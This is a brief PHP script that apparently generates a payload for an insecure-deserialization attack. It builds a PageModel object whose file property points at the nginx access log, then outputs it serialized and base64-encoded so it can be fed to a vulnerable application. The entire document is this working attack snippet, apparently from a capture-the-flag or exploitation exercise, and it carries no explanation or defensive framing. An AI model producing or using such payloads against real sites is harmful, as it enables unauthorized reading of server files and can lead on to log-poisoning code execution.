<?php
class PageModel
{
    public $file = "/var/log/nginx/access.log";
}


$obj = new PageModel;
echo base64_encode(serialize($obj));

?>

